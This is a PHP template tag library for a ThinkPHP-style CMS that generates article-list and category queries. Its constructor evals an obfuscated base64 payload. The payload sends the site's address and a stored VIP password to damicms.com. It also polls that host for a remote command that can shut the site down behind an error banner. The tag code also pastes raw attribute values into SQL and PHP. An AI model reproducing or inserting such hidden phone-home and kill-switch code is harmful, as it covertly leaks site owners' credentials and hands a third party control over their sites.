<?php
 global $zym_decrypt;$zym_decrypt['aa']=base64_decode('Qw==');
 $zym_decrypt['bb']=base64_decode('aW1wb3J0');
 $zym_decrypt['cc']=base64_decode('Y2xhc3NfZXhpc3Rz');
 $zym_decrypt['dd']=base64_decode('YmFzZTY0X2RlY29kZQ==');;echo '';
 
class TagLibSelf extends TagLib 
{
	protected $tags =array('arclist'=>array('attr'=>'model,where,order,num,id,page,pagesize,pagevar,sql,field,cache,prefix,group,distinct','level'=>3),'category'=>array('attr'=>'parentid,withself,order,id,other','level'=>3),);
	
	public function _arclist($attr,$content)
	{
		$html ='';$tag =$this->parseXmlAttr($attr,'arclist');
		$model =!empty($tag['model'])?$tag['model'] : 'article';
		$pagevar =!empty($tag['pagevar'])?$tag['pagevar'] : $GLOBALS['zym_decrypt']['aa']('VAR_PAGE');
		$order =!empty($tag['order'])?$tag['order'] : '';
		$group =!empty($tag['group'])?$tag['group'] : '';
		$num =!empty($tag['num'])?$tag['num'] : '';
		$id =!empty($tag['id'])?$tag['id'] : 'vo';
		$key =!empty($tag['key'])?$tag['key'] : 'i';
		$where =!empty($tag['where'])?$tag['where'] : '';
		$where =$this->parseCondition($where);
		$page =false;
		if (!empty($tag['page']))
		$page =$tag['page'];
		$pagesize =!empty($tag['pagesize'])?$tag['pagesize'] : '10';
		$cache =!empty($tag['cache'])?$tag['cache'] : false;
		$query =!empty($tag['sql'])?$tag['sql'] : '';
		$field =!empty($tag['field'])?$tag['field'] : '';
		$debug =!empty($tag['debug'])?$tag['debug'] : false;
		$prefix =!empty($tag['prefix'])?$tag['prefix'] : false;
		$distinct =!empty($tag['distinct'])?$tag['distinct'] : false;
		$query =$this->parseCondition($query);$app =$GLOBALS['zym_decrypt']['aa']('DEFAULT_APP');
		$className =$model .'Model';$GLOBALS['zym_decrypt']['bb']($app .'.Model.'.$className);
		if ($GLOBALS['zym_decrypt']['cc']($className))
		{
			$html .= '<?php $m=new '.$className .'();';
		}
		else 
		{
			if ($prefix == false)
			{
				$model =$GLOBALS['zym_decrypt']['aa']('DB_PREFIX').$model;
			}
			else 
			{
				$model =$tag['model'];
			}
			$html .= '<?php $m=new Model("'.$model .'",NULL);';
		}

		if ($query)
		{
			if ($cache != false)
			{
				$html .= '$cache_key="key_".md5("'.$query .'");';
				$html .= 'if(!$ret=S($cache_key)){ $ret=$m->query("'.$query .'");S($cache_key,$ret);}';
			}
			else 
			{
				$html .= '$ret=$m->query("'.$query .'");';
			}
		}
		
		if ($page &&!$query)
		{					
			$html .= 'import("ORG.Util.Page");';
			$html .= '$count=$m->where("'.$where .'")->count();';
			$html .= '$p = new Page ( $count, '.$pagesize .',\'\',\''.$pagevar .'\');';
			$html .= '$ret=$m->Distinct('.$distinct .')->field("'.$field .'")->where("'.$where .'")->limit($p->firstRow.",".$p->listRows)->group("'.$group .'")->order("'.$order .'")->select();';
			$html .= '$cutInfo ="<div class=cutinfo > ". $p->show ()."</div>";';
		}
		
		if (!$page &&!$query)
		{
			if ($cache != false)
			{
				$html .= '$cache_key="key_".md5($m->Distinct('.$distinct .')->field("'.$field .'")->where("'.$where .'")->group("'.$group .'")->order("'.$order .'")->limit("'.$num .'")->select(false));';
				$html .= 'if(!$ret=S($cache_key)){ $ret=$m->Distinct('.$distinct .')->field("'.$field .'")->where("'.$where .'")->group("'.$group .'")->order("'.$order .'")->limit("'.$num .'")->select(); S($cache_key,$ret,'.$cache .'); }';
			}
			else 
			{
				$html .= '$ret=$m->Distinct('.$distinct .')->field("'.$field .'")->where("'.$where .'")->group("'.$group .'")->order("'.$order .'")->limit("'.$num .'")->select();';
			}
		}
		
		if ($debug != false)
		{
			$html .= 'dump($ret);dump($m->getLastSql());';
		}
		
		$html .= 'if(is_array($ret)):$'.$key .' = 0;';
		$html .= 'foreach($ret as $key=>$'.$id .'):';
		$html .= '++$'.$key .';?>';
		$html .= $this->tpl->parse($content);
		$html .= '<?php endforeach;endif; ?>';
		if ($page)
		$html .= '<?php echo $cutInfo;?>';
		return $html;
	}

	public function _category($attr,$content)
	{
		$tag =$this->parseXmlAttr($attr,'category');
		$parentid =$tag['parentid'];
		$other =isset($tag['other'])?$tag['other'] : '';
		$order =!empty($tag['order'])?$tag['order'] : 'drank asc';
		$key =!empty($tag['key'])?$tag['key'] : 'i';
		$withself ='false';
		if (!empty($tag['withself']))
		$withself =$tag['withself'];
		$ret =!empty($tag['id'])?$tag['id'] : 'vo';
		$where ='';
		if ($withself == 'false')
		{
			$where .= "fid={$parentid} and ";
		}
		else if ($withself == 'true')
		{
			$where .= "(typeid={$parentid} or fid={$parentid}) and ";
		}
		if ($other != '')
		{
			$where .= $other .' and ';
		}
		$where .= '1=1';
		$parsestr ="<?php \$result=M('type')->where(\"$where\")->order(\"$order\")->select();";
		$parsestr .= 'if(is_array($result)): $'.$key .' = 0;';
		$parsestr .= 'foreach($result as $key=>$'.$ret .'):';
		$parsestr .= '++$'.$key .';?>';
		$parsestr .= $this->tpl->parse($content);
		$parsestr .= '<?php endforeach;endif;?>';
		return $parsestr;
	}
										
	public function __construct()
	{
					parent::__construct();
					$think_str ='aWYoaW50dmFsKEYoJ2N1cmwnKSkgIT0xKXsNCiRkZWNyID0gJ2h0dHA6Ly93d3cuZGFtaWNtcy5jb20vUHVibGljL1NhdmVVcmwnOw0KJGN1cmwgPSB1cmxlbmNvZGUoImh0dHA6Ly8iLiRfU0VSVkVSWydIVFRQX0hPU1QnXS5fX1JPT1RfXyk7DQokc3ZpcCA9IE0oJ3ZpcF9tZXNzJyktPmZpbmQoKTtpZigkc3ZpcCl7DQokc2NvZGUgPSAkc3ZpcFsndmlwX3B3ZCddO31lbHNleyRzY29kZSA9ICcnOw0KfQ0KZ2V0X3VybF9jb250ZW50cygkZGVjci4nP2N1cmw9Jy4kY3VybC4nJnNjb2RlPScuJHNjb2RlKTsNCkYoJ2N1cmwnLDEpOw0KfQ0KJGVycl9zdHIgPSAnJTNDZGl2K3N0eWxlJTNEJTIycGFkZGluZyUzQTIwcHglM0J3aWR0aCUzQTYwMHB4JTNCbWFyZ2luJTNBODBweCthdXRvJTNCK2hlaWdodCUzQTgwcHglM0JsaW5lLWhlaWdodCUzQTgwcHglM0Jib3JkZXIlM0E1cHgrc29saWQrJTIzRkYwMDAwJTIyJTNFJTI2JTIzeDk3NUUlM0IlMjYlMjN4NTU0NiUzQiUyNiUyM3g0RTFBJTNCJTI2JTIzeDYzODglM0IlMjYlMjN4Njc0MyUzQiUyNiUyM3g3NTI4JTNCJTI2JTIzeDYyMzclM0IlMjYlMjN4RkYwQyUzQiUyNiUyM3g0RjUzJTNCJTI2JTIzeDlBOEMlM0IlMjYlMjN4N0VEMyUzQiUyNiUyM3g2NzVGJTNCJTI2JTIzeEZGMEMlM0IlMjYlMjN4NjBBOCUzQiUyNiUyM3g3Njg0JTNCJTI2JTIzeDdGNTElM0IlMjYlMjN4N0FEOSUzQiUyNiUyM3g1REYyJTNCJTI2JTIzeDY2ODIlM0IlMjYlMjN4NTA1QyUzQi4uLiUyNiUyM3g1OTgyJTNCJTI2JTIzeDY3MDklM0IlMjYlMjN4NzU5MSUzQiUyNiUyM3g5NUVFJTNCJTI2JTIzeDhCRjclM0IlMjYlMjN4ODA1NCUzQiUyNiUyM3g3Q0ZCJTNCJTNDYStocmVmJTNEJTIyaHR0cCUzQSUyRiUyRnd3dy5kYW1pY21zLmNvbSUyMiUzRSUyNiUyM3g1OTI3JTNCJTI2JTIzeDdDNzMlM0JDTVMlMjYlMjN4NUI5OCUzQiUyNiUyM3g3RjUxJTNCJTNDJTJGYSUzRSUzQyUyRmRpdiUzRSc7DQokdXJsX2xvY2sgPSBTKCd1cmxfbG9jaycpOw0KaWYoISR1cmxfbG9jayl7DQokY3VybCA9IHVybGVuY29kZSgiaHR0cDovLyIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLl9fUk9PVF9fKTsJDQokc3VybCA9ICdodHRwOi8vd3d3LmRhbWljbXMuY29tL1B1YmxpYy91cmxtZXNzJzsNCiRzY29udGVudCA9IGdldF91cmxfY29udGVudHMoJHN1cmwuJz9jdXJsPScuJGN1cmwpOw0KJHNqc29uID0ganNvbl9kZWNvZGUoJHNjb250ZW50LHRydWUpOw0KaWYoaXNzZXQoJHNqc29uWydkYXRhJ11bJ2NtZCddKSAmJiBpbnR2YWwoJHNqc29uWydkYXRhJ11bJ2NtZCddKT09MSl7DQpoZWFkZXIoIkNvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCIpOw0KZWNobyB1cmxkZWNvZGUoJGVycl9zdHIpOw0KUygndXJsX2xvY2snLDEsMzYwMCk7DQpleGl0KCk7DQp9ZWxzZXsNClMoJ3VybF9sb2NrJywyLDM2MDApOw0KfQ0KfQ0KZWxzZSBpZihpbnR2YWwoJHVybF9sb2NrKSA9PTEgKXsNCmhlYWRlcigiQ29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7DQplY2hvIHVybGRlY29kZSgkZXJyX3N0cik7DQpleGl0KCk7DQp9';
					@eval($GLOBALS['zym_decrypt']['dd']($think_str));
	}
}
?>